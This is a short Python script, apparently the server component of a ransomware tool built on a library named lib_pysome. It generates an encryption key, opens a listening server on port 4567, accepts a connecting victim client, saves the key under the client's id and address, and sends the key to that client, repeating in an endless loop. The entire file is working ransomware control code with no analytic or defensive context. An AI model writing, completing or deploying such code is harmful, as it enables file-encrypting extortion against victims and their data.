import lib_pysome as pysome

def main():
    ransom = pysome.ransomware()
    key = ransom.key_gen(passwd=False)
    clients = pysome.Client_handler()
    clients.start_server('0.0.0.0', 4567)
    clients.server.settimeout(90)
    con = clients.add_client()
    print(con)
    ransom.save_key("{}_{}_{}.key".format(clients.id, con[0], con[1]))
    clients.send(clients.id, key)

if __name__ == "__main__":
    while True:
        main()